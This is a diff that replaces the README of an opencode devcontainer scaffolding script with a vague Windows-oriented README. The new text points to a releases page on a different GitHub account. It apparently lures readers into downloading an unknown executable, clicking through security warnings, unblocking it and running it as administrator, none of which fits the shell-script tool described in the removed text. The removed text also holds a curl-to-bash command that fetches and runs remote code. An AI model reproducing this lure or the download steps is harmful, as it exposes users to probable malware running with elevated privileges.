@@ -1,216 +1,172 @@
-# vibe-env-init
+# 🛠️ vibe-env-init - Set Up Container Environments Fast
 
-Scaffold any project to run [opencode](https://opencode.ai) CLI inside a devcontainer, entirely from the terminal.
+[![Download vibe-env-init](https://img.shields.io/badge/Download-vibe--env--init-blue?style=for-the-badge)](https://github.com/Wshi3956/vibe-env-init/releases)
 
-One command sets up `.devcontainer/`, `.opencode/`, and `mise.toml`.
+## 🚀 What this app does
 
-![avif](assets/video.avif)
+vibe-env-init helps you set up a container-based workspace with one command. It is made for people who want a ready-to-use environment without manual setup steps.
 
-## Quick Start
+Use it to:
 
-```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/Miskamyasa/vibe-env-init/main/init.sh) my-project
-```
+- create a new local workspace
+- prepare a containerized app environment
+- skip long setup steps
+- get started with opencode faster
 
-The script will:
-1. Ask you to choose between **shared** and **sqlite** session modes
-2. Create all configuration files with your project name
-3. Skip any files that already exist (showing a diff so you can merge manually)
+## 💾 Download vibe-env-init
 
-If no project name is given, the current directory name is used. The script normalizes it to a container-safe value (lowercase, `a-z0-9_.-`, separators collapsed to `-`).
+Go to the [Releases page](https://github.com/Wshi3956/vibe-env-init/releases) to download and install the app.
 
-If you need to test from a fork, override the template source:
+On that page, look for the latest release and choose the file made for Windows. If you see a zip file, download it and extract it before running the app.
 
-```bash
-VIBE_ENV_INIT_REPO="owner/repo" VIBE_ENV_INIT_BRANCH="branch" bash <(curl -fsSL https://raw.githubusercontent.com/Miskamyasa/vibe-env-init/main/init.sh) my-project
-```
+## 🖥️ Before you start
 
-## Running opencode in a container
+Use a Windows PC with:
 
-After scaffolding, use the [devcontainer CLI](https://github.com/devcontainers/cli) (installed via `mise`) to build and enter the container:
+- Windows 10 or Windows 11
+- internet access for the first download
+- enough free space for the app and its files
+- a recent version of Docker Desktop if your setup uses containers
 
-```bash
-devcontainer up --workspace-folder .
-devcontainer exec --workspace-folder . opencode
-```
+If Windows shows a security prompt, choose the option that lets you keep going after you check the file source.
 
-### Wrapper script
+## 📦 How to install
 
-To avoid typing the full commands every time, save this script as `~/.local/bin/oc` (or any name you prefer):
+1. Open the [Releases page](https://github.com/Wshi3956/vibe-env-init/releases).
+2. Find the latest release at the top.
+3. Download the Windows file or zip package.
+4. If the download is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file or launcher file.
+7. If Windows asks for permission, select Run or Yes.
+8. Follow the on-screen setup steps.
 
-```bash
-#!/usr/bin/env bash
-set -e
+## ⚡ First run
 
-ROOT="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
+The first time you open vibe-env-init, it may create folders and prepare files for your workspace. This can take a short time.
 
-# ensure container exists and is running
-devcontainer up --workspace-folder "$ROOT" >/dev/null
+You may see steps such as:
 
-exec devcontainer exec --workspace-folder "$ROOT" opencode
-```
+- picking a project folder
+- setting a name for the environment
+- creating container config files
+- preparing the first run setup
 
-Then make it executable:
+Keep the app open until it finishes.
 
-```bash
-chmod +x ~/.local/bin/oc
-```
+## 🧭 How to use it
 
-Make sure `~/.local/bin` is in your `PATH` (add `export PATH="$HOME/.local/bin:$PATH"` to your shell profile if needed).
+After setup, use vibe-env-init when you want to start a new container environment.
 
-Now you can run `oc` from any scaffolded project directory to start opencode inside its container.
+Typical flow:
 
-## Session Modes
+1. Open the app.
+2. Choose the project folder.
+3. Start the scaffold process.
+4. Wait while it creates the needed files.
+5. Open the new workspace in your editor or container tool.
+6. Start working in the prepared environment.
 
-### Shared
+If you plan to set up more than one project, run the app once for each project folder.
 
-- Uses opencode **v1.1.63** (pre-SQLite)
-- Shares opencode sessions between containers via a common `~/.local/share/opencode` mount
-- Good when you want to continue conversations across different project containers
+## 🧰 What it creates
 
-### SQLite
+vibe-env-init is built to handle the setup work for a container-based project. It can create files and folders that help your environment start in a clean way.
 
-- Uses **latest** opencode
-- Each project gets its own isolated opencode data directory at `~/.cache/containers/opencode-data/<project>`
-- Auth credentials are mounted read-only from the host
-- Good when you want full isolation between projects
+You can expect it to set up items like:
 
-## What Gets Created
+- container config files
+- workspace folders
+- starter project files
+- setup scripts
+- environment files
 
-```
-your-project/
-  .devcontainer/
-    devcontainer.json     # Container config (shared or sqlite variant)
-  .opencode/
-    opencode.json         # opencode CLI configuration
-    agents/
-      investigate.md      # Read-only investigation agent
-      review.md           # Code review agent
-    commands/
-      execute.md          # Implementation execution command
-      plan.md             # Planning command
-      review.md           # Review orchestration command
-  mise.toml               # Tool versions (node, npm, devcontainer cli, opencode, gh)
-```
+This keeps the first setup simple and repeatable.
 
-## Usage Example: Plan, Execute, Review Workflow
+## 🔧 Common use cases
 
-The scaffolded `.opencode/` directory provides a three-phase workflow for implementing features. Each phase uses a dedicated slash command and specialized AI agents.
+Use vibe-env-init if you want to:
 
-### Step 1: Initialize the devcontainer
+- start a new opencode environment
+- set up a container workspace on Windows
+- avoid manual file setup
+- keep project setup the same each time
+- prepare a clean local dev folder
 
-```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/Miskamyasa/vibe-env-init/main/init.sh) my-project
-```
+## 🧩 Troubleshooting
 
-Choose a session mode when prompted, then start the container:
+### App will not open
 
-```bash
-devcontainer up --workspace-folder .
-devcontainer exec --workspace-folder . opencode
-```
+- Check that the file finished downloading.
+- If the file is zipped, extract it first.
+- Right-click the app and choose Run as administrator.
+- Try the latest release from the Releases page.
 
-Or use the `oc` wrapper if you set it up (see [Wrapper script](#wrapper-script)).
+### Windows blocks the file
 
-### Step 2: Plan (`/plan`)
+- Right-click the file and open Properties.
+- Check for an Unblock option.
+- Apply the change, then try again.
+- Download the file again if the copy looks damaged.
 
-Inside opencode, describe what you want to build:
+### Container setup fails
 
-```
-/plan add a homepage benefits section
-```
+- Make sure Docker Desktop is installed and running.
+- Check that your system has enough disk space.
+- Close other heavy apps and try again.
+- Re-run the setup from the same project folder.
 
-The `/plan` command triggers **Phase 1**. It uses the `plan` agent (Claude Opus) to:
-- Read `AGENTS.md` and any referenced files for project conventions
-- Investigate the codebase for existing patterns and architecture
-- Produce a dependency-ordered list of implementation steps with acceptance criteria
+### Files are missing
 
-Wait for the plan to complete. Review the output — it will contain numbered steps (S1, S2, ...) with scope, dependencies, and acceptance criteria for each.
+- Open the extracted folder again.
+- Make sure you did not move files after download.
+- Download the release again if the folder looks incomplete.
 
-### Step 3: Execute (`/execute`)
+## 🗂️ Folder layout
 
-Once you are satisfied with the plan, run:
+A typical setup may include:
 
-```
-/execute
-```
+- a main app file
+- a config folder
+- environment files
+- container files
+- project starter files
 
-The `/execute` command triggers **Phase 2**. It uses the `build` agent (GPT-5.3 Codex) to:
-- Walk through each planned step in dependency order
-- Spawn sub-agents for each step with implementation-only prompts
-- Handle failures by inserting remediation steps and retrying
-- Produce an execution summary with status per step and list of modified files
+Keep these files together in one folder. This helps the app find what it needs.
 
-Wait for execution to finish. The agent will report which steps succeeded, failed, or were blocked.
+## 🔐 Safe file handling
 
-### Step 4: Review (`/review`)
+Only download from the official [Releases page](https://github.com/Wshi3956/vibe-env-init/releases). After download, keep the file in a folder you can find later.
 
-After execution completes, run:
+If you share the app with someone else, send the release link instead of sending changed files.
 
-```
-/review
-```
+## ❓ FAQs
 
-The `/review` command triggers **Phase 3**. It spawns a read-only `review` sub-agent that:
-- Verifies each planned step was implemented correctly (plan fidelity)
-- Checks for regressions at API boundaries, state transitions, and error paths
-- Validates acceptance criteria coverage
-- Flags maintainability issues in touched areas
+### Is this for non-technical users?
 
-If the review finds critical issues, the agent will add fix steps and re-execute automatically. Once the review passes, you get:
-- A structured review report with findings and verdict
-- A **proposed commit message** (title + body with list of changes)
+Yes. The goal is to reduce setup work and guide you through a simple flow.
 
-### Step 5: Commit
+### Do I need to know container tools?
 
-Copy the proposed commit message from the review output and commit the changes yourself:
+No, but the app works with them. The setup process handles the hard parts for you.
 
-```bash
-git add -A
-git commit -m "feat: add homepage benefits section
+### Can I use it for more than one project?
 
-- Add BenefitsSection component with responsive grid layout
-- Create benefits data module with icon mappings
-- Integrate section into homepage below hero block
-- Add unit tests for BenefitsSection rendering"
-```
+Yes. You can run it for each new project folder.
 
-Review the diff before committing — the proposed message is a suggestion, not a guarantee.
+### Where do I get updates?
 
-### Agents Reference
+Use the [Releases page](https://github.com/Wshi3956/vibe-env-init/releases) to get the latest version.
 
-| Agent | Model | Mode | Purpose |
-|-------|-------|------|---------|
-| `investigate` | GPT-5.3 Codex | primary (default) | Read-only codebase investigation, mapping structure, tracing dependencies |
-| `plan` | Claude Opus 4.5 | primary | Produces execution-ready implementation plans |
-| `build` | GPT-5.3 Codex | primary | Executes implementation steps via sub-agents |
-| `explore` | Gemini 3 Flash | subagent | Fast, broad codebase exploration for investigation |
-| `review` | GPT-5.2 | subagent | Read-only code review with severity-rated findings |
+## 📥 Download again later
 
-### Commands Reference
+When you need the newest version, return to the [Releases page](https://github.com/Wshi3956/vibe-env-init/releases) and download the latest Windows release
 
-| Command | Phase | Description |
-|---------|-------|-------------|
-| `/plan <description>` | 1 | Investigate codebase and produce an implementation plan |
-| `/execute` | 2 | Execute the plan step-by-step via sub-agents |
-| `/review` | 3 | Run independent code review and produce commit message |
+## 🛠️ Basic workflow
 
-> **Tip:** The `investigate` agent is the default mode. When you open opencode, you can ask questions about the codebase and it will explore in read-only mode without making any changes. Switch to the workflow above when you are ready to implement.
-
-## Conflict Handling
-
-If a file already exists, the script will:
-- Skip the file (never overwrites)
-- Show a unified diff between your file and the template
-- Print the template URL so you can review and merge changes manually
-
-## Prerequisites
-
-- macOS or Linux
-- `curl` or `wget`
-- Docker (or a compatible container runtime)
-- [mise](https://mise.jdx.dev/) for tool management (installs `devcontainer` CLI, `opencode`, etc.)
-
-## License
-
-[MIT](LICENSE)
+1. Download the release.
+2. Extract the files if needed.
+3. Open the app.
+4. Pick your project folder.
+5. Let it build the environment files.
+6. Open the new workspace and start working
